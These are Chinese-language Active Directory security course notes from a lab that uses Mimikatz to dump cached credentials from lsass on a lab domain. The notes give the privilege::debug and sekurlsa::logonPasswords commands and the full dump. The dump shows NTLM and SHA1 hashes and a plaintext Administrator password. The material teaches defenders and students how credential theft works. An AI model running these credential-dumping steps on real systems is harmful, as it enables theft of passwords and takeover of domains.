---
title: NTUSTISC - AD Note - Lab(透過Mimikatz取得Local Admin的NTLM)
tags: [NTUSTISC, AD, information security]

category: "Security/Course/NTUST ISC/AD/3. 更多密碼"
---

# NTUSTISC - AD Note - Lab(透過Mimikatz取得Local Admin的NTLM)
<!-- more -->
[TOC]

Lecture Video: [2022/05/04 AD 安全1](https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&t=4257)

## Background
得到更高權限之後，會想要更多的密碼
* 密碼收集
    * SAM.hive(Security Account Manager)
    * Password Spraying(用猜的)
    * GPO
        * Where: `\\<domain>\SysVol\<domain>\Policie`，以本次實驗為例，就是放在`\\kuma.org\SYSVOL\kuma.org\Policies`，接下來就是隨機生成的`<UID>\Users\Scripts`和`<UID>\Machine\Scripts`，這兩個腳本是我們覺得重要的
    * 記憶體(lsass)
        * 為了獲取更多其他帳號密碼，嘗試逼近Domain Admin，可以使用Mimikatz獲取暫存憑證
        * ==What is Mimikatz?==
            >Mimikatz為一個強力的Windows提權工具，可以提升Process權限、注入Process讀取Process記憶體，可以直接從lsass中獲取當前登錄過系統用戶的帳號明文密碼。
            >lsass是微軟Windows系統的安全機制它主要用於本地安全和登陸策略，通常我們在登陸系統時輸入密碼之後，密碼便會儲存在lsass內存中，經過其wdigest和tspkg兩個模塊調用後，對其使用可逆的算法進行加密並存儲在內存之中，而mimikatz正是通過對lsass的逆算獲取到明文密碼。
            簡單說就是所有登入認證都交給lsass，所以他有所有人的認證憑證
        * Download: [Mimikatz-github](https://github.com/gentilkiwi/mimikatz)
        * How to use: 
        Mimikatz最新版本一共三個文件(mimilib.dll、mimikatz.exe、mimidrv.sys)，分為Win32位(多了一個mimilove.exe文件)和X64位
        下載後解壓縮即可使用，裡面分為Win32和X64，Win32是針對Windows32位，而X64是針對64位作業系統，目前絕大部分作業系統為64位
        * ==lsass.exe VS SAM==
        SAM只會存取本地用戶的NTLM Hash，而lsass.exe是只要有存取過目前電腦的使用者都會被記錄，例如domain admin或是其他使用者利用smb連過來也會被lsass紀錄

## Lab

### ==透過Mimikatz取得Local Admin的NTLM==
1. Activate Mimikatz
進入`C:\tools\mimikatz_trunk\x64`右鍵以系統管理員身分執行mimikatz.exe(一定要用系統管理員才能執行提權的debug)
2. 起手式
    ```bash
    mimikatz # Privilege::Debug
    Privilege '20' OK

    mimikatz # log
    Using 'mimikatz.log' for logfile : OK

    mimikatz # Sekurlsa::logonPasswords
    ```
    :::spoiler Log Reuslt
    ```bash
    Using 'mimikatz.log' for logfile : OK

    mimikatz # Sekurlsa::logonPasswords

    Authentication Id : 0 ; 23133312 (00000000:0160fc80)
    Session           : CachedInteractive from 1
    User Name         : Administrator
    Domain            : kuma
    Logon Server      : WIN-818G5VCOLJO
    Logon Time        : 2023/9/4  06:07:18
    SID               : S-1-5-21-306106713-2531972042-334329499-500
        msv :	
         [00000003] Primary
         * Username : Administrator
         * Domain   : kuma
         * NTLM     : 7ecffff0c3548187607a14bad0f88bb1
         * SHA1     : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
         * DPAPI    : cf967ea9c9c0f9d58b79fdd040270648
        tspkg :	
        wdigest :	
         * Username : Administrator
         * Domain   : kuma
         * Password : (null)
        kerberos :	
         * Username : Administrator
         * Domain   : KUMA.ORG
         * Password : 1qaz@WSX3edc
        ssp :	
        credman :	
        cloudap :	

    Authentication Id : 0 ; 20047794 (00000000:0131e7b2)
    Session           : CachedInteractive from 1
    User Name         : Administrator
    Domain            : kuma
    Logon Server      : WIN-818G5VCOLJO
    Logon Time        : 2023/9/4  10:19:22
    SID               : S-1-5-21-306106713-2531972042-334329499-500
        msv :	
         [00000003] Primary
         * Username : Administrator
         * Domain   : kuma
         * NTLM     : 7ecffff0c3548187607a14bad0f88bb1
         * SHA1     : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
         * DPAPI    : cf967ea9c9c0f9d58b79fdd040270648
        tspkg :	
        wdigest :	
         * Username : Administrator
         * Domain   : kuma
         * Password : (null)
        kerberos :	
         * Username : Administrator
         * Domain   : KUMA.ORG
         * Password : (null)
        ssp :	
        credman :	
        cloudap :	

    Authentication Id : 0 ; 16441076 (00000000:00fadef4)
    Session           : Interactive from 1
    User Name         : administrator
    Domain            : kuma
    Logon Server      : WIN-818G5VCOLJO
    Logon Time        : 2023/9/4  12:44:48
    SID               : S-1-5-21-306106713-2531972042-334329499-500
        msv :	
         [00000003] Primary
         * Username : Administrator
         * Domain   : kuma
         * NTLM     : 7ecffff0c3548187607a14bad0f88bb1
         * SHA1     : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
         * DPAPI    : cf967ea9c9c0f9d58b79fdd040270648
        tspkg :	
        wdigest :	
         * Username : Administrator
         * Domain   : kuma
         * Password : (null)
        kerberos :	
         * Username : administrator
         * Domain   : KUMA.ORG
         * Password : (null)
        ssp :	
        credman :	
        cloudap :	

    Authentication Id : 0 ; 14849757 (00000000:00e296dd)
    Session           : Service from 0
    User Name         : DefaultAppPool
    Domain            : IIS APPPOOL
    Logon Server      : (null)
    Logon Time        : 2023/9/3  09:44:12
    SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
        msv :	
         [00000003] Primary
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
        tspkg :	
        wdigest :	
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * Password : (null)
        kerberos :	
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma.org
         * Password : maj"2g<h(&iQZ7kqFHQ4X&c;_wQq3V;*gq.(A=4&)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF
        ssp :	
        credman :	
        cloudap :	

    Authentication Id : 0 ; 1299130 (00000000:0013d2ba)
    Session           : Interactive from 1
    User Name         : bear
    Domain            : kuma
    Logon Server      : WIN-818G5VCOLJO
    Logon Time        : 2023/8/29  12:47:58
    SID               : S-1-5-21-306106713-2531972042-334329499-2101
        msv :	
         [00000003] Primary
         * Username : bear
         * Domain   : kuma
         * NTLM     : 7ecffff0c3548187607a14bad0f88bb1
         * SHA1     : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
         * DPAPI    : 4057a0d0b94378dd03224e8b3d28a006
        tspkg :	
        wdigest :	
         * Username : bear
         * Domain   : kuma
         * Password : (null)
        kerberos :	
         * Username : bear
         * Domain   : KUMA.ORG
         * Password : (null)
        ssp :	
        credman :	
        cloudap :	

    Authentication Id : 0 ; 995 (00000000:000003e3)
    Session           : Service from 0
    User Name         : IUSR
    Domain            : NT AUTHORITY
    Logon Server      : (null)
    Logon Time        : 2023/8/29  12:40:42
    SID               : S-1-5-17
        msv :	
        tspkg :	
        wdigest :	
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :	
        ssp :	
        credman :	
        cloudap :	

    Authentication Id : 0 ; 997 (00000000:000003e5)
    Session           : Service from 0
    User Name         : LOCAL SERVICE
    Domain            : NT AUTHORITY
    Logon Server      : (null)
    Logon Time        : 2023/8/29  12:40:39
    SID               : S-1-5-19
        msv :	
        tspkg :	
        wdigest :	
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :	
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :	
        credman :	
        cloudap :	

    Authentication Id : 0 ; 70138 (00000000:000111fa)
    Session           : Interactive from 1
    User Name         : DWM-1
    Domain            : Window Manager
    Logon Server      : (null)
    Logon Time        : 2023/8/29  12:40:38
    SID               : S-1-5-90-0-1
        msv :	
         [00000003] Primary
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
        tspkg :	
        wdigest :	
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * Password : (null)
        kerberos :	
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma.org
         * Password : maj"2g<h(&iQZ7kqFHQ4X&c;_wQq3V;*gq.(A=4&)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF
        ssp :	
        credman :	
        cloudap :	

    Authentication Id : 0 ; 70109 (00000000:000111dd)
    Session           : Interactive from 1
    User Name         : DWM-1
    Domain            : Window Manager
    Logon Server      : (null)
    Logon Time        : 2023/8/29  12:40:38
    SID               : S-1-5-90-0-1
        msv :	
         [00000003] Primary
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
        tspkg :	
        wdigest :	
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * Password : (null)
        kerberos :	
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma.org
         * Password : maj"2g<h(&iQZ7kqFHQ4X&c;_wQq3V;*gq.(A=4&)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF
        ssp :	
        credman :	
        cloudap :	

    Authentication Id : 0 ; 996 (00000000:000003e4)
    Session           : Service from 0
    User Name         : DESKTOP-G95U93T$
    Domain            : kuma
    Logon Server      : (null)
    Logon Time        : 2023/8/29  12:40:38
    SID               : S-1-5-20
        msv :	
         [00000003] Primary
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
        tspkg :	
        wdigest :	
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * Password : (null)
        kerberos :	
         * Username : desktop-g95u93t$
         * Domain   : KUMA.ORG
         * Password : (null)
        ssp :	
        credman :	
        cloudap :	

    Authentication Id : 0 ; 47346 (00000000:0000b8f2)
    Session           : Interactive from 1
    User Name         : UMFD-1
    Domain            : Font Driver Host
    Logon Server      : (null)
    Logon Time        : 2023/8/29  12:40:38
    SID               : S-1-5-96-0-1
        msv :	
         [00000003] Primary
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
        tspkg :	
        wdigest :	
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * Password : (null)
        kerberos :	
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma.org
         * Password : maj"2g<h(&iQZ7kqFHQ4X&c;_wQq3V;*gq.(A=4&)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF
        ssp :	
        credman :	
        cloudap :	

    Authentication Id : 0 ; 46297 (00000000:0000b4d9)
    Session           : Interactive from 0
    User Name         : UMFD-0
    Domain            : Font Driver Host
    Logon Server      : (null)
    Logon Time        : 2023/8/29  12:40:38
    SID               : S-1-5-96-0-0
        msv :	
         [00000003] Primary
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
        tspkg :	
        wdigest :	
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * Password : (null)
        kerberos :	
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma.org
         * Password : maj"2g<h(&iQZ7kqFHQ4X&c;_wQq3V;*gq.(A=4&)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF
        ssp :	
        credman :	
        cloudap :	

    Authentication Id : 0 ; 44132 (00000000:0000ac64)
    Session           : UndefinedLogonType from 0
    User Name         : (null)
    Domain            : (null)
    Logon Server      : (null)
    Logon Time        : 2023/8/29  12:40:37
    SID               : 
        msv :	
         [00000003] Primary
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
        tspkg :	
        wdigest :	
        kerberos :	
        ssp :	
        credman :	
        cloudap :	

    Authentication Id : 0 ; 999 (00000000:000003e7)
    Session           : UndefinedLogonType from 0
    User Name         : DESKTOP-G95U93T$
    Domain            : kuma
    Logon Server      : (null)
    Logon Time        : 2023/8/29  12:40:37
    SID               : S-1-5-18
        msv :	
        tspkg :	
        wdigest :	
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * Password : (null)
        kerberos :	
         * Username : desktop-g95u93t$
         * Domain   : KUMA.ORG
         * Password : (null)
        ssp :	
        credman :	
        cloudap :	

    ```
    :::
    可以看到這一份檔案比前面提到的SAM還要完整很多，用log的原因是他會把輸出dump下來，用熟悉的文字編輯器尋找有用的資訊比較方便，另外，==Privilege::Debug==的意思是跟windows取得debug lsass的權限